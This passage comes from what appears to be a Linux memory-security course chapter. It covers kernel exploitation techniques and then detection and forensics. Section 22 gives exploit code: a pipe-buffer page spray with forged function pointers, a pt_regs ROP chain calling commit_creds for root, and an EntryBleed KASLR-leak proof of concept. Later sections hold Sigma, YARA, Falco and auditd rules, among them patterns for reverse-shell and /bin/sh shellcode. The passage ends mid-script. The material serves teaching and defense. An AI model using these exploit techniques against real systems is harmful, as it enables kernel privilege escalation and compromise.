**Physmap spray.** The attacker allocates many user-space pages via `mmap(MAP_ANONYMOUS | MAP_POPULATE)`, fills them with controlled data, and hopes that when the kernel frees and re-allocates a page (e.g., for a slab object), one of the attacker's pages is physically adjacent or reused. This is probabilistic but becomes reliable when:

- The attacker can force the target kernel allocation to use a specific page order.
- Memory pressure is low and the buddy allocator returns recently freed pages.

**Pipe buffer page reclaim.** A more targeted approach uses `splice` and pipe operations. When a pipe buffer references a page and the pipe is closed, the page is freed back to the page allocator. The attacker can control the content of this page (written via `write()` to the pipe) and its release timing (closing the pipe file descriptor).

```c
/* Targeted page spray via pipe buffers */
#define SPRAY_PAGES 1024
int spray_pipes[SPRAY_PAGES][2];

/* Allocate and fill pipe pages with controlled content */
for (int i = 0; i < SPRAY_PAGES; i++) {
    pipe(spray_pipes[i]);
    char payload[4096];
    /* Fill with a forged kernel structure — e.g., a fake
       pipe_buf_operations with function pointers targeting
       a ROP gadget or stack pivot. */
    memset(payload, 0, sizeof(payload));
    struct fake_ops {
        void *confirm;   /* pipe_buf_confirm — set to xchg gadget */
        void *release;
        void *steal;
        void *get;
    };
    struct fake_ops *ops = (struct fake_ops *)payload;
    ops->confirm = (void *)CONTROLLED_GADGET_ADDR;
    ops->release = (void *)CONTROLLED_GADGET_ADDR;

    write(spray_pipes[i][1], payload, sizeof(payload));
}

/* Free all pipe pages simultaneously to return them to the
   page allocator, where the kernel may reclaim them. */
for (int i = 0; i < SPRAY_PAGES; i++) {
    close(spray_pipes[i][0]);
    close(spray_pipes[i][1]);
}

/* The freed pages, still containing our forged structures,
   are now in the buddy allocator's free list. A subsequent
   kernel page allocation may reclaim one. */
```

### 22.3 Kernel stack pivoting via pt_regs

When the kernel enters syscall handling, the user-space register state is saved to `struct pt_regs` at the top of the kernel stack. An attacker who controls the register values at syscall entry (trivially — they set them in user space) can place ROP chain data in `pt_regs` and then pivot the stack pointer to `pt_regs`.

**ROP chain in pt_regs.** On x86_64, `pt_regs` contains (from low to high address on the kernel stack): `r15`, `r14`, `r13`, `r12`, `rbp`, `rbx`, `r11`, `r10`, `r9`, `r8`, `rax`, `rcx`, `rdx`, `rsi`, `rdi`, `orig_rax`, `rip`, `cs`, `eflags`, `rsp`, `ss`. The attacker controls all general-purpose registers. By loading each register with a ROP gadget address or data value before invoking the syscall, the attacker places a ROP chain on the kernel stack.

**Stack pivot.** The attacker needs a write primitive that overwrites a function pointer with a stack pivot gadget (`xchg rax, rsp; ret` or `mov rsp, <reg>; ret`). If `rax` contains the address of `pt_regs` on the kernel stack (which can be calculated because the kernel stack is at a known offset from `task_struct` — 16 KiB aligned), the pivot redirects the kernel's stack to the attacker-controlled `pt_regs`, and the ROP chain executes.

```asm
; Example stack layout in pt_regs after controlled syscall entry:
; Low address (kernel stack top)
;   r15  = gadget: pop rdi; ret
;   r14  = &init_cred  (argument to commit_creds)
;   r13  = gadget: commit_creds address
;   r12  = gadget: swapgs_restore_regs_and_return_to_usermode
;   rbp  = user_rip  (return to userspace function)
;   rbx  = user_cs
;   r11  = user_rflags
;   r10  = user_rsp
;   r9   = user_ss
; The pivot gadget (xchg rax, rsp; ret) lands rsp at r15,
; and the chain executes: pop rdi -> &init_cred -> commit_creds -> return
```

```c
/* Setting up pt_regs for a ROP chain before triggering
   the vulnerability that calls the overwritten function pointer. */
void trigger_exploit(void)
{
    unsigned long pop_rdi_ret       = KBASE + 0x12345;  /* pop rdi; ret */
    unsigned long init_cred         = KBASE + 0xABCDE;
    unsigned long commit_creds      = KBASE + 0xFEDCB;
    unsigned long kpti_trampoline   = KBASE + 0x98765;

    /* Load registers with ROP chain values, then invoke syscall
       that triggers the corrupted function pointer. */
    asm volatile(
        "mov %0, %%r15\n"
        "mov %1, %%r14\n"
        "mov %2, %%r13\n"
        "mov %3, %%r12\n"
        :: "r"(pop_rdi_ret),
           "r"(init_cred),
           "r"(commit_creds),
           "r"(kpti_trampoline)
        : "r15", "r14", "r13", "r12"
    );

    /* Trigger the bug — e.g., ioctl that reaches the corrupted
       function pointer. The overwritten pointer is a stack-pivot
       gadget (xchg rax, rsp; ret) with rax pointing to pt_regs. */
    ioctl(vuln_fd, TRIGGER_CMD, 0);
}
```

### 22.4 KASLR defeat: advanced techniques beyond §13

Section 13 covered information leaks, format strings, `/proc/self/maps`, brute force, and partial overwrites. Modern KASLR bypasses include:

**Prefetch side-channel.** The x86 `prefetch` instruction's timing varies depending on whether the target virtual address is mapped in any address space (including the kernel's, on systems without full KPTI). By measuring `prefetch` latency across the kernel address range, an attacker can identify mapped kernel pages and determine the KASLR base. Mitigated by KPTI (which unmaps kernel pages from user-space page tables) and by microcode updates on newer CPUs.

**EntryBleed (CVE-2022-4543).** On x86_64 without KPTI, the kernel entry trampoline for `entry_SYSCALL_64` is at a fixed offset from the KASLR base. During syscall entry, the CPU speculatively accesses kernel memory, and the TLB state reveals whether certain kernel addresses are mapped. By probing which addresses cause TLB fills (measurable via page walk timing), the attacker infers the kernel base. Affected: kernels without KPTI enabled (some cloud VMs disable KPTI for performance). The fix clears the relevant TLB entries during syscall return.

```c
/* EntryBleed KASLR leak PoC sketch (CVE-2022-4543)
   Works only when KPTI is disabled. */
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define KERNEL_BASE_MIN  0xffffffff80000000ULL
#define KERNEL_BASE_MAX  0xffffffffc0000000ULL
#define KERNEL_BASE_STEP 0x200000ULL  /* 2 MB alignment */

static inline uint64_t probe_address(uint64_t addr)
{
    uint64_t t1, t2;
    unsigned int aux;

    _mm_mfence();
    t1 = __rdtscp(&aux);
    /* prefetcht0 — bring into L1 cache.
       Timing difference reveals TLB hit (mapped) vs miss. */
    asm volatile("prefetcht0 (%0)" :: "r"(addr));
    _mm_mfence();
    t2 = __rdtscp(&aux);

    return t2 - t1;
}

int main(void)
{
    uint64_t best_addr = 0;
    uint64_t best_time = UINT64_MAX;

    for (uint64_t addr = KERNEL_BASE_MIN;
         addr < KERNEL_BASE_MAX;
         addr += KERNEL_BASE_STEP)
    {
        uint64_t total = 0;
        for (int i = 0; i < 1000; i++)
            total += probe_address(addr);
        uint64_t avg = total / 1000;
        if (avg < best_time) {
            best_time = avg;
            best_addr = addr;
        }
    }
    printf("Estimated kernel base: 0x%lx (timing: %lu)\n",
           best_addr, best_time);
    return 0;
}
```

**`/proc/kallsyms` when `kptr_restrict=0`.** Some misconfigured systems or debug kernels expose raw kernel symbol addresses. Always verify `kptr_restrict` in your hardening (§20.1):

```bash
# Check if kernel pointers are leaked
cat /proc/kallsyms | head -5
# If addresses are 0000000000000000 -> kptr_restrict is working
# If real addresses -> KASLR is effectively bypassed
```

### 22.5 Ret2dir revisited: practical considerations

The ret2dir attack (§18.1) requires mapping the physical address of user-controlled data. Since Linux 4.0, `/proc/PID/pagemap` PFN bits require `CAP_SYS_ADMIN`. Modern approaches to discover physical addresses for ret2dir:

- **Timing-based page frame discovery.** Using row-buffer timing (DRAMA attack) to determine DRAM row/bank/channel mapping and thus infer physical addresses. Requires precise timing and knowledge of the DRAM controller.
- **Huge page side-channel.** Transparent Huge Pages (THP) merge contiguous physical pages into 2 MB pages. By forcing THP allocation and measuring `pagemap` (which does expose the huge-page bit even without `CAP_SYS_ADMIN` on some kernels), partial physical address information leaks.
- **Kernel info leaks.** Any kernel pointer leak that reveals a physmap address directly provides the physical address (subtract `PAGE_OFFSET`). Combined with the CVE walkthroughs in §21, these leaks are often a preliminary step.

### 22.6 Speculative execution and memory layout implications

Speculative execution attacks (Spectre, Meltdown, MDS variants) have deep memory-layout implications. While Domain 7 covers the microarchitectural mechanisms in detail, the process-memory-relevant aspects include:

- **Meltdown (CVE-2017-5754)** allows user space to read kernel memory by racing speculative execution against permission checks. KPTI (§10.3) removes kernel mappings from the user-space page tables, eliminating the speculative read target.
- **Spectre-BHB / BTI** can be used to speculatively redirect kernel branch targets to attacker-controlled addresses, enabling speculative reads from arbitrary kernel memory. The memory layout — specifically the position of the speculative gadget relative to the target data — determines whether the attack succeeds.
- **L1TF (Foreshadow)** exploits the L1 data cache to read physical memory content from L1 even when the PTE marks the page as not-present. This bypasses KPTI but requires the target data to reside in L1.

These techniques convert memory-layout knowledge (KASLR base, physmap offset, specific data structure locations) into data disclosure. Hardening the memory layout (§20) and process isolation (KPTI, STIBP, microcode updates) are the primary defenses. Cross-reference Domain 7 for full treatment.

---

## 23. Memory detection engineering

This section provides production-grade detection rules for memory-manipulation attack indicators, extending the detection coverage in §19 with Sigma rules, YARA signatures, eBPF-based runtime detection, and automated anomaly scanning.

### 23.1 Sigma rules for memory attack indicators

#### Suspicious mmap with PROT_EXEC on anonymous pages

```yaml
title: Anonymous Executable Memory Allocation via mmap
id: c3d4e5f6-a7b8-9012-cdef-234567890123
status: stable
description: >
    Detects mmap syscalls creating anonymous memory regions with execute
    permission. Legitimate uses include JIT compilers (JVM, V8, LuaJIT);
    anomalous in most server workloads.
author: Security Engineering
date: 2025-01-15
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: mmap
        a3|contains: '0x22'  # MAP_ANONYMOUS | MAP_PRIVATE
    filter_prot:
        a2|re: '0x[0-9a-f]*[4-7c-f]'  # PROT_EXEC bit set
    filter_known_jit:
        exe|endswith:
            - '/java'
            - '/node'
            - '/python3'
            - '/qemu-system-x86_64'
            - '/chromium'
            - '/firefox'
            - '/luajit'
    condition: selection and filter_prot and not filter_known_jit
level: medium
tags:
    - attack.defense_evasion
    - attack.t1055.012
    - cve.2021.22555
falsepositives:
    - Custom JIT compilers
    - Dynamic code generation frameworks
```

#### mprotect W-to-X transition

```yaml
title: Memory Protection Change from Writable to Executable
id: d4e5f6a7-b8c9-0123-def0-345678901234
status: stable
description: >
    Detects mprotect syscall adding PROT_EXEC to a previously writable
    region. Classic shellcode activation pattern: allocate RW, write
    shellcode, then mprotect to RX or RWX.
author: Security Engineering
date: 2025-01-15
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: mprotect
    filter_exec:
        a2|re: '0x[0-9a-f]*[4-7c-f]'  # PROT_EXEC bit set
    filter_known:
        exe|endswith:
            - '/java'
            - '/node'
            - '/dotnet'
            - '/mono'
    condition: selection and filter_exec and not filter_known
level: high
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1055
```

#### Userfaultfd registration from non-root

```yaml
title: Unprivileged userfaultfd Registration
id: e5f6a7b8-c9d0-1234-ef01-456789012345
status: stable
description: >
    Detects userfaultfd syscall from non-root processes. userfaultfd
    is a key exploitation primitive for race-condition vulnerabilities,
    allowing the attacker to pause kernel page fault handling.
    See Chapter 2B §6 for userfaultfd internals.
author: Security Engineering
date: 2025-01-15
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: userfaultfd
    filter_root:
        uid: '0'
    condition: selection and not filter_root
level: high
tags:
    - attack.privilege_escalation
    - attack.t1068
```

#### Cross-process memory access via process_vm_readv/writev

```yaml
title: Cross-Process Memory Access via process_vm_readv or process_vm_writev
id: f6a7b8c9-d0e1-2345-f012-567890123456
status: stable
description: >
    Detects process_vm_readv and process_vm_writev syscalls, which allow
    direct reading/writing of another process's address space. Legitimate
    uses include debuggers and certain profilers; otherwise highly suspicious.
author: Security Engineering
date: 2025-02-01
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall:
            - process_vm_readv
            - process_vm_writev
    filter_debuggers:
        exe|endswith:
            - '/gdb'
            - '/lldb'
            - '/strace'
            - '/valgrind'
    condition: selection and not filter_debuggers
level: high
tags:
    - attack.credential_access
    - attack.t1003.007
```

#### /proc/pid/mem writes

```yaml
title: Write Access to /proc/PID/mem
id: a7b8c9d0-e1f2-3456-0123-678901234567
status: stable
description: >
    Detects open/openat of /proc/<pid>/mem with write flags.
    Writing to /proc/pid/mem modifies the target process's
    address space — a process injection technique.
author: Security Engineering
date: 2025-02-01
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: openat
    filter_path:
        a1|re: '/proc/[0-9]+/mem'
    filter_write:
        a2|contains: 'O_WRONLY'
    condition: selection and filter_path and filter_write
level: critical
tags:
    - attack.defense_evasion
    - attack.t1055.009
```

#### MAP_FIXED on existing mappings

```yaml
title: MAP_FIXED mmap Overlaying Existing Mapping
id: b8c9d0e1-f2a3-4567-1234-789012345678
status: stable
description: >
    Detects mmap with MAP_FIXED flag, which forcibly replaces existing
    mappings at the specified address. Used in MAP_FIXED library
    replacement attacks (§17).
author: Security Engineering
date: 2025-02-01
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: mmap
        a3|contains: '0x10'  # MAP_FIXED
    filter_known:
        exe|endswith:
            - '/ld-linux-x86-64.so.2'
            - '/ld-linux-aarch64.so.1'
    condition: selection and not filter_known
level: medium
tags:
    - attack.defense_evasion
    - attack.t1574.006
```

### 23.2 YARA rules for memory forensics

#### Kernel exploit payload signatures in memory dumps

```yara
rule Linux_Kernel_Exploit_Cred_Overwrite
{
    meta:
        description = "Detects common kernel exploit credential overwrite patterns in memory dumps"
        author = "Security Engineering"
        date = "2025-01-15"
        reference = "commit_creds(prepare_kernel_cred(NULL)) pattern"

    strings:
        /* prepare_kernel_cred(NULL) -> commit_creds() call sequence
           in disassembled exploit shellcode */
        $prep_kern_cred_call = {
            48 31 FF           /* xor rdi, rdi    (NULL argument) */
            48 B8 ?? ?? ?? ??  /* movabs rax, <prepare_kernel_cred> */
            ?? ?? ?? ??
            FF D0              /* call rax */
            48 89 C7           /* mov rdi, rax    (cred pointer) */
        }

        /* commit_creds call following prepare_kernel_cred */
        $commit_creds_call = {
            48 B8 ?? ?? ?? ??  /* movabs rax, <commit_creds> */
            ?? ?? ?? ??
            FF D0              /* call rax */
        }

        /* Common stack pivot gadgets used in kernel exploits */
        $xchg_rax_rsp = { 48 94 C3 }  /* xchg rax, rsp; ret */
        $mov_rsp_rax  = { 48 89 C4 C3 }  /* mov rsp, rax; ret */

        /* Dirty Pipe: PIPE_BUF_FLAG_CAN_MERGE manipulation */
        $pipe_merge_flag = "PIPE_BUF_FLAG_CAN_MERGE"

    condition:
        ($prep_kern_cred_call and $commit_creds_call) or
        (2 of ($xchg_rax_rsp, $mov_rsp_rax)) or
        $pipe_merge_flag
}

rule Linux_ROP_Gadget_Chain_Pattern
{
    meta:
        description = "Detects ROP gadget chain patterns typical of kernel exploits"
        author = "Security Engineering"
        date = "2025-01-15"

    strings:
        /* Sequence of kernel-range pointers (0xffffffff8XXXXXXX)
           at 8-byte alignment — characteristic of ROP chain on stack */
        $rop_chain_pattern = {
            ?? ?? ?? ?? FF FF FF FF  /* kernel pointer 1 */
            ?? ?? ?? ?? FF FF FF FF  /* kernel pointer 2 */
            ?? ?? ?? ?? FF FF FF FF  /* kernel pointer 3 */
            ?? ?? ?? ?? FF FF FF FF  /* kernel pointer 4 */
        }

        /* KPTI trampoline return sequence (swapgs + iretq) */
        $kpti_trampoline = { 0F 01 F8 48 CF }  /* swapgs; iretq */

    condition:
        #rop_chain_pattern > 3 or $kpti_trampoline
}

rule Linux_Exploit_Shellcode_In_Anonymous_Region
{
    meta:
        description = "Detects shellcode payloads in anonymous memory regions"
        author = "Security Engineering"
        date = "2025-02-01"

    strings:
        /* execve("/bin/sh") shellcode variants */
        $binsh_1 = "/bin/sh"
        $binsh_2 = { 2F 62 69 6E 2F 73 68 00 }
        /* setuid(0) + execve pattern */
        $setuid_execve = {
            48 31 FF           /* xor rdi, rdi */
            B8 69 00 00 00     /* mov eax, 0x69 (setuid) */
            0F 05              /* syscall */
        }
        /* Reverse shell connect-back */
        $socket_connect = {
            B8 29 00 00 00     /* mov eax, 0x29 (socket) */
            0F 05              /* syscall */
        }

    condition:
        ($binsh_1 or $binsh_2) and ($setuid_execve or $socket_connect)
}
```

### 23.3 Volatility3 plugins for Linux memory forensics

Volatility3 provides several plugins relevant to memory-manipulation detection. These are used on memory dumps acquired via LiME or `/proc/kcore` (§24).

| Plugin | Purpose | Detection target |
|---|---|---|
| `linux.pslist` | List running processes from `task_struct` linked list | Hidden processes (compare against `linux.psscan`) |
| `linux.psscan` | Scan for `task_struct` signatures in raw memory | Processes unlinked from the task list (rootkit hiding) |
| `linux.proc_maps` | Reconstruct `/proc/PID/maps` from VMA structures | W+X regions, anonymous exec, MAP_FIXED artifacts |
| `linux.check_syscall` | Verify syscall table integrity | Hooked syscall entries pointing outside kernel text |
| `linux.hidden_modules` | Detect kernel modules hidden from `lsmod` | Rootkit modules unlinked from module list |
| `linux.check_idt` | Verify Interrupt Descriptor Table integrity | IDT hooks redirecting interrupts to malicious handlers |
| `linux.bash` | Recover bash command history from process memory | Attacker commands in shell history |
| `linux.elfs` | Extract ELF binaries mapped in process memory | Injected or packed binaries |

**Example Volatility3 workflow for detecting memory manipulation:**

```bash
# Step 1: Acquire memory (see §24 for LiME usage)
# Assuming we have a memory dump: memory.lime

# Step 2: List processes and look for anomalies
vol3 -f memory.lime linux.pslist
vol3 -f memory.lime linux.psscan

# Step 3: Compare pslist vs psscan — hidden processes
# If psscan finds PIDs not in pslist, they are hidden (rootkit)
vol3 -f memory.lime linux.pslist --pid 1234
vol3 -f memory.lime linux.psscan --pid 1234

# Step 4: Check memory maps for suspicious regions
vol3 -f memory.lime linux.proc_maps --pid 1234
# Look for: r-xp anonymous regions, rwxp regions, gaps in library mappings

# Step 5: Verify syscall table integrity
vol3 -f memory.lime linux.check_syscall
# Hooked entries show handler addresses outside kernel text range

# Step 6: Check for hidden kernel modules
vol3 -f memory.lime linux.hidden_modules

# Step 7: Extract suspicious ELF binaries
vol3 -f memory.lime linux.elfs --pid 1234 --dump
```

### 23.4 eBPF-based runtime detection

#### Falco rules for memory operation anomalies

Falco (CNCF project) uses kernel-level instrumentation to detect runtime anomalies. Memory-specific rules:

```yaml
# falco_memory_rules.yaml

- rule: Suspicious mprotect Adding Execute Permission
  desc: >
    Detects mprotect syscall changing memory protection to include
    PROT_EXEC. Common shellcode activation technique.
  condition: >
    evt.type = mprotect and
    evt.arg.prot contains PROT_EXEC and
    not proc.name in (java, node, python3, dotnet, qemu-system-x86)
  output: >
    mprotect +PROT_EXEC detected
    (pid=%proc.pid pname=%proc.name prot=%evt.arg.prot
     addr=%evt.arg.addr user=%user.name container=%container.id)
  priority: WARNING
  tags: [host, process, mitre_defense_evasion]

- rule: Process Writing to /proc/pid/mem
  desc: >
    Detects a process opening /proc/<pid>/mem for writing,
    enabling direct memory modification of another process.
  condition: >
    open_write and fd.name glob "/proc/*/mem" and
    not proc.name in (gdb, lldb, strace)
  output: >
    /proc/pid/mem write access
    (pid=%proc.pid pname=%proc.name target=%fd.name user=%user.name)
  priority: CRITICAL
  tags: [host, process, mitre_defense_evasion]

- rule: Userfaultfd from Non-Root Process
  desc: >
    Detects unprivileged userfaultfd syscall, commonly used as a
    race-condition exploitation primitive.
  condition: >
    evt.type = userfaultfd and user.uid != 0
  output: >
    Unprivileged userfaultfd
    (pid=%proc.pid pname=%proc.name user=%user.name uid=%user.uid)
  priority: WARNING
  tags: [host, process, mitre_privilege_escalation]

- rule: High Frequency mmap/munmap Cycles
  desc: >
    Detects rapid mmap/munmap cycling indicative of heap spray
    or address-space manipulation.
  condition: >
    (evt.type = mmap or evt.type = munmap) and
    evt.count[5s] > 500 and
    not proc.name in (java, chrome, firefox)
  output: >
    High-frequency mmap/munmap cycling
    (pid=%proc.pid pname=%proc.name count=%evt.count[5s])
  priority: NOTICE
  tags: [host, process, mitre_defense_evasion]
```

#### Tetragon tracing policies

Tetragon (Cilium project) provides kernel-level enforcement. A TracingPolicy for memory operations:

```yaml
# tetragon_memory_policy.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: memory-manipulation-detection
spec:
  kprobes:
    - call: "security_mmap_file"
      syscall: false
      args:
        - index: 0
          type: file
        - index: 1
          type: uint64  # reqprot
        - index: 2
          type: uint64  # prot
        - index: 3
          type: uint64  # flags
      selectors:
        - matchArgs:
            - index: 2
              operator: "MaskSet"
              values:
                - "6"  # PROT_WRITE | PROT_EXEC
          matchActions:
            - action: Post
              rateLimit: "1m"
              rateLimitScope: process

    - call: "security_file_mprotect"
      syscall: false
      args:
        - index: 0
          type: "nop"  # vm_area_struct
        - index: 1
          type: uint64  # reqprot
        - index: 2
          type: uint64  # prot
      selectors:
        - matchArgs:
            - index: 2
              operator: "MaskSet"
              values:
                - "4"  # PROT_EXEC
          matchActions:
            - action: Post
```

### 23.5 /proc/pid/maps anomaly detection script

An enhanced scanner that goes beyond the basic VMA scanner in §19.1 to detect exploitation artifacts from the CVEs and techniques in §21–§22:

```python
#!/usr/bin/env python3
"""advanced_maps_scanner.py — detect memory exploitation indicators.

Checks for:
  1. W+X (write+execute) anonymous regions
  2. Executable anonymous regions not in known JIT list
  3. Library VMAs replaced by anonymous mappings (MAP_FIXED abuse)
  4. Suspicious permission transitions between adjacent VMAs
  5. Multiple anonymous RW regions sized for heap spray (e.g., 0x1000 * N)
  6. Pipe buffer spray indicators (many /dev/zero or anon mappings)
  7. Stack regions outside expected address range

Usage: python3 advanced_maps_scanner.py <pid|--all>
"""
import sys
import os
import re
from collections import Counter

KNOWN_JIT_PROCS = {
    "java", "node", "python3", "chrome", "firefox",
    "qemu-system-x86_64", "luajit", "dotnet", "mono",
    "chromium-browse", "chromium",
}

EXPECTED_LIBS = {
    "libc.so", "libpthread.so", "ld-linux",
    "libm.so", "libdl.so", "librt.so",
}

def parse_maps(pid):
    path = f"/proc/{pid}/maps"
    vmas = []
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(None, 5)
                addr_range = parts[0]
                perms = parts[1]
                offset = parts[2]
                dev = parts[3]
                inode = parts[4]
                name = parts[5] if len(parts) > 5 else ""
                start, end = addr_range.split("-")
                vmas.append({
                    "start": int(start, 16),
                    "end": int(end, 16),
                    "perms": perms,
                    "offset": offset,
                    "dev": dev,
                    "inode": inode,
                    "name": name.strip(),
                    "raw": line,
                })
    except (PermissionError, FileNotFoundError):
        return None
    return vmas

def get_comm(pid):
    try:
        return open(f"/proc/{pid}/comm").read().strip()
    except (FileNotFoundError, PermissionError):
        return "?"

def scan(pid, vmas):
    findings = []
    comm = get_comm(pid)
    is_jit = comm in KNOWN_JIT_PROCS

    anon_rw_sizes = Counter()
    anon_exec_count = 0

    for i, vma in enumerate(vmas):
        perms = vma["perms"]
        name = vma["name"]
        size = vma["end"] - vma["start"]
        is_anon = (vma["inode"] == "0" and not name)

        # 1. W+X mapping
        if "w" in perms and "x" in perms:
            findings.append(("CRITICAL", "WX_MAPPING", vma["raw"]))

        # 2. Anonymous executable (non-JIT)
        if "x" in perms and is_anon and not is_jit:
            anon_exec_count += 1
            findings.append(("HIGH", "ANON_EXEC", vma["raw"]))

        # 3. Library gap detection (MAP_FIXED replacement)
        if i > 0 and name and name == vmas[i-1].get("name"):
            prev = vmas[i-1]
            gap = vma["start"] - prev["end"]
            if gap > 0x1000:
                findings.append(("MEDIUM", "LIBRARY_GAP",
                    f"Gap {gap:#x} bytes in {name}"))

        # 4. Anonymous RW accumulation (heap spray indicator)
        if "r" in perms and "w" in perms and is_anon:
            anon_rw_sizes[size] += 1

        # 5. Stack outside expected range (x86_64: 0x7ff...)
        if name == "[stack]":
            if not (0x7f0000000000 <= vma["start"] <= 0x7fffffffffff):
                findings.append(("HIGH", "STACK_ANOMALY",
                    f"Stack at unexpected address: {vma['start']:#x}"))

    # 6. Heap spray detection: many identical-size anonymous RW regions
    for sz, count in anon_rw_sizes.items():
        if count > 50 and sz <= 0x10000:
            findings.append(("MEDIUM", "HEAP_SPRAY_INDICATOR",
                f"{count} anonymous RW regions of size {sz:#x}"))

    # 7. Excessive anonymous exec regions
    if anon_exec_count > 5 and not is_jit:
        findings.append(("HIGH", "MANY_ANON_EXEC",
            f"{anon_exec_count} anonymous executable regions"))

    return findings

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pid|--all>", file=sys.stderr)
        sys.exit(1)

    targets = []
    if sys.argv[1] == "--all":
        for entry in os.listdir("/proc"):
            if entry.isdigit():
                targets.append(entry)
    else:
        targets.append(sys.argv[1])

    for pid in targets:
        vmas = parse_maps(pid)
        if vmas is None:
            continue
        findings = scan(pid, vmas)
        if findings:
            comm = get_comm(pid)
            print(f"=== PID {pid} ({comm}) ===")
            for sev, typ, detail in findings:
                print(f"  [{sev}] {typ}: {detail}")

if __name__ == "__main__":
    main()
```

### 23.6 Auditd rules — comprehensive memory-manipulation ruleset

A consolidated auditd configuration file covering all memory-related attack indicators discussed in this chapter:

```bash
# /etc/audit/rules.d/50-memory-manipulation.rules
# Memory manipulation detection rules for Linux audit subsystem
# Reference: Domain 2 Chapter 2A §23

## mmap with W+X (PROT_WRITE|PROT_EXEC = 0x6)
-a always,exit -F arch=b64 -S mmap -F a2&=0x6 -k memory_wx_mmap

## mprotect adding PROT_EXEC (bit 0x4)
-a always,exit -F arch=b64 -S mprotect -F a2&=0x4 -k memory_mprotect_exec

## MAP_FIXED mmap (flag bit 0x10)
-a always,exit -F arch=b64 -S mmap -F a3&=0x10 -k memory_map_fixed

## userfaultfd from any process
-a always,exit -F arch=b64 -S userfaultfd -k memory_userfaultfd

## process_vm_readv / process_vm_writev (cross-process memory access)
-a always,exit -F arch=b64 -S process_vm_readv -k memory_cross_process_read
-a always,exit -F arch=b64 -S process_vm_writev -k memory_cross_process_write

## ptrace POKETEXT/POKEDATA (code injection via ptrace)
-a always,exit -F arch=b64 -S ptrace -F a0=4 -k memory_ptrace_poketext
-a always,exit -F arch=b64 -S ptrace -F a0=5 -k memory_ptrace_pokedata

## /proc/pid/mem access
-a always,exit -F arch=b64 -S openat -F a2&=0x1 -F path=/proc/*/mem -k memory_proc_mem_write

## /proc/pid/pagemap access (physical address leak for ret2dir)
-a always,exit -F arch=b64 -S openat -F path=/proc/*/pagemap -k memory_pagemap_access

## madvise MADV_DONTNEED (value 4) — Dirty COW indicator
-a always,exit -F arch=b64 -S madvise -F a2=4 -k memory_madvise_dontneed

## /proc/self/maps reading (ASLR information leak)
-a always,exit -F arch=b64 -S openat -F path=/proc/self/maps -k memory_maps_read

## nfnetlink socket creation (nf_tables exploit prerequisite)
-a always,exit -F arch=b64 -S socket -F a0=16 -F a2=12 -k memory_nfnetlink
```

---

## 24. Memory forensics deep dive

This section covers the full memory forensics workflow: acquisition, analysis, rootkit detection, user-space artifact recovery, and timeline construction. While §19 focused on live-system detection, this section addresses post-incident memory analysis.

### 24.1 Linux memory acquisition

#### LiME (Linux Memory Extractor)

LiME is the standard tool for Linux memory acquisition. It is a loadable kernel module that dumps physical memory to a file or network socket.

```bash
# Build LiME for the running kernel
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make
# Produces lime-$(uname -r).ko

# Acquire memory to local file (lime format — includes metadata)
sudo insmod lime-$(uname -r).ko "path=/evidence/memory.lime format=lime"
# The module dumps memory and automatically unloads.

# Acquire memory in raw (padded) format — compatible with more tools
sudo insmod lime-$(uname -r).ko "path=/evidence/memory.raw format=padded"

# Acquire memory over the network (avoids disk writes on the target)
# On the forensic workstation:
nc -l -p 4444 > /evidence/memory.lime
# On the target:
sudo insmod lime-$(uname -r).ko "path=tcp:4444 format=lime"

# Verify acquisition integrity
sha256sum /evidence/memory.lime > /evidence/memory.lime.sha256
```

**Forensic considerations:**

- LiME requires loading a kernel module, which modifies kernel state (module list, memory allocations). Document the acquisition timestamp (UTC ISO 8601) and LiME version.
- On systems with Secure Boot or module signing enforcement, the LiME module must be signed with a trusted key.
- Prefer network acquisition to avoid writing to the target's storage (evidence contamination).

#### /dev/crash and /proc/kcore

```bash
# /proc/kcore — virtual file representing kernel virtual address space
# Requires root. Not a true physical dump but can extract process memory.
sudo cp /proc/kcore /evidence/kcore.elf

# /dev/crash — provided by the crash driver (some distros)
# Requires: crash module loaded (modprobe crash)
sudo dd if=/dev/crash of=/evidence/crash.raw bs=1M

# /proc/kcore is an ELF core file — examine with gdb or crash utility
file /evidence/kcore.elf
# Output: ELF 64-bit LSB core file
```

**Limitations.** `/proc/kcore` does not capture a consistent snapshot (memory can change during the read). It also does not include hardware-reserved memory regions. LiME provides a more forensically sound acquisition.

### 24.2 Volatility3 Linux analysis workflow

#### Profile generation

Volatility3 for Linux requires symbol information matching the kernel version. This is provided via ISF (Intermediate Symbol Format) files generated from the kernel's debug symbols:

```bash
# Generate ISF from dwarf2json (Volatility3 tool)
# Requires: kernel debug symbols (vmlinux with DWARF)
git clone https://github.com/volatilityfoundation/dwarf2json.git
cd dwarf2json && go build

# Generate the ISF file
./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-$(uname -r) \
    > linux-$(uname -r).json

# Place in Volatility3's symbol directory
cp linux-$(uname -r).json \
    /path/to/volatility3/volatility3/symbols/linux/

# Alternatively, use the banners to auto-detect
vol3 -f memory.lime banners
```

#### Process memory reconstruction

```bash
# List all processes with full details
vol3 -f memory.lime linux.pslist --columns \
    pid,ppid,uid,gid,comm,create_time

# Reconstruct process memory maps (equivalent to /proc/PID/maps)
vol3 -f memory.lime linux.proc_maps --pid 1234

# Dump a specific process's memory regions
vol3 -f memory.lime linux.proc_maps --pid 1234 --dump \
    --output-dir /evidence/pid_1234/

# Extract all mapped ELF binaries from a process
vol3 -f memory.lime linux.elfs --pid 1234 --dump \
    --output-dir /evidence/pid_1234_elfs/
```

#### VMA analysis for exploitation artifacts

```python
#!/usr/bin/env python3
"""vol3_vma_analyzer.py — post-process Volatility3 linux.proc_maps output
to detect exploitation artifacts.

Usage: vol3 -f memory.lime linux.proc_maps --pid 1234 -r csv | \
       python3 vol3_vma_analyzer.py
"""
import sys
